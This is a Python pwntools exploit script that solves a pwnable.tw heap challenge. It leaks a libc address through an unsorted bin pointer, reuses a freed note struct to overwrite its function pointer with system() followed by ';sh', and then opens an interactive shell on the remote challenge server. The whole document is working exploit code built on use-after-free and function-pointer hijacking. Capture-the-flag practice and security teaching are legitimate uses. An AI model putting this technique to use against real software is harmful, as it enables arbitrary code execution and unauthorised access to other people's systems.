###unsorted bin leak + hijack function ptr

from pwn import *

###Utils
def create(size,data):
    r.sendlineafter('choice :','1')
    r.sendlineafter('size :',str(size))
    r.sendafter('Content :',data)

def delete(idx):
    r.sendlineafter('choice :','2')
    r.sendlineafter('Index :',str(idx))

def show(idx):
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :',str(idx))
    return u32(r.recvline().strip()[-4:])

def getshell():
    r.sendlineafter('choice :','3')
    r.sendlineafter('Index :','2')
    r.interactive()

###Useful addr
#  libc2.23
main_arena_offset = 0x1b0780
unsorted_offset = main_arena_offset+0x30
system_offset = 0x3a940

###Explout
r = remote('chall.pwnable.tw',10102)

###Leak address with unsorted bin ptr
create(0x80,'a')    #0
create(0x80,'a')    #1
delete(0)
create(0x80,'a')    #2
unsorted_addr = show(2)
libc_base = unsorted_addr-unsorted_offset

###hijack function ptr in entry struct + set argument to sh
delete(2)
delete(1)
create(0x8,p32(system_offset+libc_base)+b';sh\x00')    #3
getshell()
